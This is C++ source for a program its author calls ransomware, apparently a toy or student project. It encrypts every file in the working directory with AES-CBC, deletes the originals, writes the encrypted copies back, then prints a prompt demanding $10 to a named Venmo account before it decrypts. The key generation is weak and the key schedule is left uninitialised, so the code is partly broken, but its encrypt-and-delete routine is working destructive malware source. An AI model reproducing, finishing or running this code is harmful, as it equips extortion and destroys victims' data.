#include <cstdio>
#include <iostream>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
//#include <tuchar.h>
#include "crypto-algorithms/aes.h"
#include "crypto-algorithms/aes.c"
#include <windows.h>
#include <string.h> 
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <dirent.h>
#include <direct.h>
#include <time.h>
//#pragma execution_unsigned character_set( "utf-8" );

unsigned char * CTXT_FROM_READ;
unsigned char * CTXT_ORIGINAL;
char * NAME_OF_PROGRAM = "ransomware.exe";
void get_file_names(char * path){
  DIR *dir; struct dirent *diread;
  if ((dir = opendir(path)) != nullptr){
    while((diread = readdir(dir)) != nullptr){
      printf("%s\n", diread->d_name);
    }
    closedir(dir); 
  }
}

unsigned char* read_file(char* path, long &ptlen){
  FILE *fileptr;
  long filelen;
  //printf("start of read file\nptlen: %ld\n",ptlen);
  fileptr = fopen(path, "rb");  // Open the file in binary mode
  fseek(fileptr, 0, SEEK_END);          // Jump to the end of the file
  //printf("made it past fseek\n");
  fflush(stdout);
  filelen = ftell(fileptr);             // Get the current byte offset in the file
  rewind(fileptr);                      // Jump back to the beginning of the file

  //printf("ptlen: %ld\nfilelen %ld\n", ptlen, filelen);
  fflush(stdout);
  unsigned char* buffer = (unsigned char*)calloc((filelen), sizeof(unsigned char)); // Enough memory for the file
  fread(buffer, filelen, 1, fileptr); // Read in the entire file
  fclose(fileptr); // Close the file
  ptlen = filelen;
  return buffer;
}

//create file
bool create_file_bin(char* path, unsigned char* data, long size){
  FILE *fileptr = fopen(path, "w+b");
  fwrite((uint8_t*)data, size, sizeof(uint8_t), fileptr);
  fclose(fileptr);
  return 1;
}

bool create_file_char(char* path, unsigned char* data, long size){
  FILE *fileptr = fopen(path, "w+");
  fwrite((uint8_t*)data, size, sizeof(uint8_t), fileptr);
  fclose(fileptr);
  return 1;
}

//delete file
bool delete_file(char* path){
  if(remove(path) != 0)
    return 0;
  return 1;
}

unsigned char* enc_file(char* path, WORDA * key_schedule, const BYTE iv[], long &lenPT){
  unsigned char* plaintxt = read_file(path, lenPT);

  if (lenPT%AES_BLOCK_SIZE != 0){
    unsigned char * temp = (unsigned char*)calloc((lenPT + (AES_BLOCK_SIZE - lenPT%AES_BLOCK_SIZE)),sizeof(unsigned char));
    memcpy((void*)temp, (void*)plaintxt, lenPT);
    free(plaintxt);
    plaintxt = temp;
    lenPT += (AES_BLOCK_SIZE - lenPT%AES_BLOCK_SIZE);
  }
  unsigned char* buffer = (unsigned char *)calloc(lenPT, sizeof(unsigned char));

  aes_encrypt_cbc((BYTE *)plaintxt, lenPT, (BYTE *)buffer, key_schedule, 256, iv);
  return buffer;
}

//dec file
unsigned char* dec_file(char* path, WORDA * key_schedule, const BYTE iv[], long &lenPT){
  long encLen; 
  unsigned char* ciphertxt = read_file(path, encLen);
  //printf("filelen %ld\n", encLen); 
  unsigned char* plaintxt = (unsigned char*)calloc((encLen), sizeof(unsigned char));
  aes_decrypt_cbc((BYTE *)ciphertxt, encLen, (BYTE *)plaintxt, key_schedule, 256, iv);
  lenPT = encLen;
  return plaintxt; 
}

//enc dir
void enc_dir(char * path, WORDA * key_schedule, const BYTE iv[]){
  DIR *dir; struct dirent *diread;
  long len = 0; 
  if ((dir = opendir(path)) != nullptr){
    while((diread = readdir(dir)) != nullptr){
      //printf("%s\n%d %d %d\n", diread->d_name, strcmp(diread->d_name, NAME_OF_PROGRAM),strcmp(diread->d_name, "."),strcmp(diread->d_name, "..")     );


      if(strcmp(diread->d_name, NAME_OF_PROGRAM) != 0 && strcmp(diread->d_name, ".") != 0 && strcmp(diread->d_name, "..")!=0){
        len = 0;
        unsigned char * buffer = enc_file(diread->d_name, key_schedule, iv, len);
        delete_file(diread->d_name);
        create_file_bin(diread->d_name, buffer, (len * sizeof(unsigned char)));
        free(buffer);
      }
    }
    closedir(dir); 
  }
}

//dec dir
void dec_dir(char * path, WORDA * key_schedule, const BYTE iv[]){
  DIR *dir; struct dirent *diread;
  long len = 0; 
  if ((dir = opendir(path)) != nullptr){
    while((diread = readdir(dir)) != nullptr){
     // printf("%s\n%d %d %d\n", diread->d_name, strcmp(diread->d_name, NAME_OF_PROGRAM),strcmp(diread->d_name, "."),strcmp(diread->d_name, "..")     );
      if(strcmp(diread->d_name, NAME_OF_PROGRAM)!= 0 && strcmp(diread->d_name, ".")!=0 && strcmp(diread->d_name, "..") != 0  ){ 
        len = 0;
        unsigned char * buffer = dec_file(diread->d_name, key_schedule, iv, len);
        create_file_bin(diread->d_name, buffer, (len * sizeof(unsigned char)));
        free(buffer);
      }
    }
    closedir(dir); 
  }
}

void randsom_note(){
  char c; 
  while(1){
    printf("Did you send 10 dollars to the venmo account (@Henry-Helstad)? (y/n)\n" );
    Sleep(10); 
    c =  getchar();

    if(c == 'y' || c == 'Y')
      return;
  }
}


//This key generation is not even remotely uniformly random
unsigned char* randGen(int size){
  unsigned char* buffer = (unsigned char*) malloc(size * sizeof(unsigned char));
  srand(time(NULL));
  for( int i = 0; i < size; i++){
    buffer[i] = rand() % 256;
  }
  return buffer; 
}


int main()
{
  //printf("\nbegining of setup...\n");
  //TEST ----------------------------------------------------------------------------------------------------
  //Hard coded the key and the IV needs to be changed
  WORDA key_schedule[60];
/*	BYTE enc_buf[128];
	BYTE plaintext[1][32] = {
		{0x6b,0xc1,0xbe,0xe2,0x2e,0x40,0x9f,0x96,0xe9,0x3d,0x7e,0x11,0x73,0x93,0x17,0x2a,0xae,0x2d,0x8a,0x57,0x1e,0x03,0xac,0x9c,0x9e,0xb7,0x6f,0xac,0x45,0xaf,0x8e,0x51}
	};*/
/*	BYTE ciphertext[1][32] = {
		{0xf5,0x8c,0x4c,0x04,0xd6,0xe5,0xf1,0xba,0x77,0x9e,0xab,0xfb,0x5f,0x7b,0xfb,0xd6,0x9c,0xfc,0x4e,0x96,0x7e,0xdb,0x80,0x8d,0x67,0x9f,0x77,0x7b,0xc6,0x70,0x2c,0x7d}
	};
	BYTE iv[1][16] = {
		{0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f}
	};
	BYTE key[1][32] = {
		{0x60,0x3d,0xeb,0x10,0x15,0xca,0x71,0xbe,0x2b,0x73,0xae,0xf0,0x85,0x7d,0x77,0x81,0x1f,0x35,0x2c,0x07,0x3b,0x61,0x08,0xd7,0x2d,0x98,0x10,0xa3,0x09,0x14,0xdf,0xf4}
	}; */
	int pass = 1;
  BYTE** key = (unsigned char **)calloc( 1, sizeof(unsigned char *));
  key[0] = (unsigned char*)calloc(32, sizeof(unsigned char)); 
  key[0] = randGen(32);

  BYTE** iv = (unsigned char **)calloc( 1, sizeof(unsigned char *));
  iv[0] = (unsigned char*)calloc(16, sizeof(unsigned char)); 
  iv[0] = randGen(16);
/*
  BYTE** ciphertext = (unsigned char **)calloc( 1, sizeof(unsigned char *));
  ciphertext[0] = (unsigned char*)calloc(32, sizeof(unsigned char)); 
  

	aes_key_setup(key[0], key_schedule, 256);

   
	aes_encrypt_cbc(plaintext[0], 32, enc_buf, key_schedule, 256, iv[0]);
	//pass = pass && !memcmp(enc_buf, ciphertext[0], 32);

	aes_decrypt_cbc(ciphertext[0], 32, enc_buf, key_schedule, 256, iv[0]);
	pass = pass && !memcmp(enc_buf, plaintext[0], 32);
 */ 
//  SetConsoleOutputCP( 65001 );
//  printf( "Testing unicode -- English -- Ελληνικά -- Español -- Русский. aäbcdefghijklmnoöpqrsßtuüvwxyz\n" );
//  printf("if it passes the test: %u", pass);
  //TEST ------------------------------------------------------------------------------------------------------- 
  
  //ENC FILE
  /*long len = 0;
  unsigned char * buffer = enc_file("test.txt", key_schedule, iv[0], len);
  //printf("%s \n %d \n %ld\n", buffer, strlen((char*)buffer), len);
  fflush(stdout);
  delete_file("test.txt"); 
  delete_file("test.txt.enc");
  //Sleep(50);
  create_file_bin("test.txt.enc", buffer, (len * sizeof(unsigned char)));
  unsigned char * ptBuff = dec_file("test.txt.enc", key_schedule, iv[0], len);
  //printf("\n%s\n", ptBuff);
  create_file_bin("text.txt", ptBuff, (len * sizeof(unsigned char)));*/
  char path[256];
  _getcwd(path, 256);
  printf("%s\n", path);
  fflush(stdout);
  enc_dir(path, key_schedule, iv[0]); 
  randsom_note();
  dec_dir(path, key_schedule, iv[0]);


   
  
 // Sleep(100000000);
  return 0; 
}
